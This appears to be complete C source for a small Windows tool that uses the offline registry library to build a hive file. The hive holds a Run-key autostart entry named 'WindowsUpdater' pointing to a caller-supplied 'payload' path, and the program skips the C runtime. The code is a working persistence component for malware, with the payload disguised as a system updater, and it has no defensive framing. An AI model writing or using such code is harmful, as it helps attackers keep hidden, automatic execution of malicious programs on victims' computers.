#include <windows.h>
#include <shellapi.h>

// 核心逻辑：接收参数并生成文件
int RealMain(int argc, char* argv[]) {
    if (argc != 3) return 1;

    WCHAR payloadPath[MAX_PATH] = {0};
    WCHAR outputPath[MAX_PATH] = {0};
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, payloadPath, MAX_PATH);
    MultiByteToWideChar(CP_ACP, 0, argv[2], -1, outputPath, MAX_PATH);

    HMODULE hMod = LoadLibraryA("offreg.dll");
    if (!hMod) hMod = LoadLibraryA("C:\\Windows\\SysWOW64\\offreg.dll");
    if (!hMod) hMod = LoadLibraryA("C:\\Windows\\System32\\offreg.dll");
    if (!hMod) return 1;

    typedef PVOID ORHKEY;
    typedef LONG (WINAPI* pORCreateHive)(ORHKEY*);
    typedef LONG (WINAPI* pORCreateKey)(ORHKEY, LPCWSTR, LPCWSTR, DWORD, REGSAM, PVOID, ORHKEY*, LPDWORD);
    typedef LONG (WINAPI* pORSetValue)(ORHKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LONG (WINAPI* pORSaveHive)(ORHKEY, LPCWSTR, DWORD, DWORD);

    pORCreateHive CreateHive = (pORCreateHive)GetProcAddress(hMod, "ORCreateHive");
    pORCreateKey CreateKey = (pORCreateKey)GetProcAddress(hMod, "ORCreateKey");
    pORSetValue SetValue = (pORSetValue)GetProcAddress(hMod, "ORSetValue");
    pORSaveHive SaveHive = (pORSaveHive)GetProcAddress(hMod, "ORSaveHive");

    if (!CreateHive || !CreateKey || !SetValue || !SaveHive) return 1;

    ORHKEY hHive = NULL;
    if (CreateHive(&hHive) != ERROR_SUCCESS) return 1;

    ORHKEY hKey = NULL;
    DWORD dwDisposition;
    if (CreateKey(hHive, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return 1;
    }

    int len = 0; while(payloadPath[len]) len++;
    if (SetValue(hKey, L"WindowsUpdater", 0, REG_SZ, (const BYTE*)payloadPath, (DWORD)((len + 1) * sizeof(WCHAR))) != ERROR_SUCCESS) {
        return 1;
    }

    // 直接利用 Win7 内核版本，不调用 RtlGetVersion 减少复杂依赖
    SaveHive(hHive, outputPath, 6, 1);
    return 0;
}

// 终极入口：完全脱离 C 运行库，自己接管程序起点
void __stdcall EntryPoint() {
    int argc = 0;
    LPWSTR* argvW = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argvW || argc != 3) {
        ExitProcess(1);
    }

    // 手工将宽字符参数转换为窄字符
    char arg1[MAX_PATH] = {0};
    char arg2[MAX_PATH] = {0};
    WideCharToMultiByte(CP_ACP, 0, argvW[1], -1, arg1, MAX_PATH, NULL, NULL);
    WideCharToMultiByte(CP_ACP, 0, argvW[2], -1, arg2, MAX_PATH, NULL, NULL);
    
    char* argvA[3] = { (char*)"main.exe", arg1, arg2 };

    RealMain(3, argvA);
    ExitProcess(0);
}
